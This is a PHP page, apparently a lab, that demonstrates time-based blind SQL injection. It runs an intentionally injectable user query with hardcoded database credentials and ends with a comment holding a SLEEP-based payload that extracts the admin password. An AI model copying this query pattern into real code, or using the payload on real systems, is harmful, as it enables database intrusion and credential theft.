<?php
// Database configuration
$host = 'localhost';
$dbname = 'webapp_db';
$username = 'user_mohamed';
$password = 'mody_aly2020';

// Create connection
$conn = new mysqli($host, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Set error reporting
ini_set('display_errors', 1);
error_reporting(E_ALL);

?>
<!DOCTYPE html>
<html>
<head>
    <title>Time-Based Blind SQL Injection Demo</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
        .container { background: #f5f5f5; padding: 20px; border-radius: 5px; }
        .query-box { background: white; padding: 15px; border: 1px solid #ddd; margin: 10px 0; }
        .error { color: red; background: #fee; padding: 10px; border: 1px solid red; }
        .success { color: green; }
        form { margin: 20px 0; }
        input[type="text"] { padding: 8px; width: 300px; }
        button { padding: 8px 15px; background: #4CAF50; color: white; border: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Time-Based Blind SQL Injection</h1>
        <p>This page demonstrates Time-Based Blind SQL injection vulnerabilities.</p>
        
        <form method="GET">
            <label>Enter User ID: 
                <input type="text" name="username" value="<?= htmlspecialchars($_GET['username'] ?? '1') ?>">
            </label>
            <button type="submit">Query</button>
        </form>

        <?php
        if (isset($_GET['username'])) {
            $username = $_GET['username'];
            
            // Vulnerable query
            $sql = "SELECT * FROM users WHERE username = '$username'";
            
            echo "<div class='query-box'>";
            echo "<h3>Executed Query:</h3>";
            echo "<code>" . htmlspecialchars($sql) . "</code>";
            echo "</div>";
            
            try {
                $result = $conn->query($sql);
                
                if ($result) {
                    if ($result->num_rows > 0) {
                        echo "<div class='success'>";
                        echo "<h3>Query Results:</h3>";
                        $row = $result->fetch_assoc();
                        echo "<pre>" . print_r($row, true) . "</pre>";
                        echo "</div>";
                    } else {
                        echo "<p>No user found with that ID.</p>";
                    }
                }
            } catch (Exception $e) {
                echo "<div class='error'>";
                echo "<h3>Database Error:</h3>";
                echo "<p>" . $e->getMessage() . "</p>";
                echo "</div>";
            }
        }
        ?>
</body>
</html>
<?php
$conn->close();
?>

<!-- Input: admin' OR IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a', SLEEP(5), 0) -- -->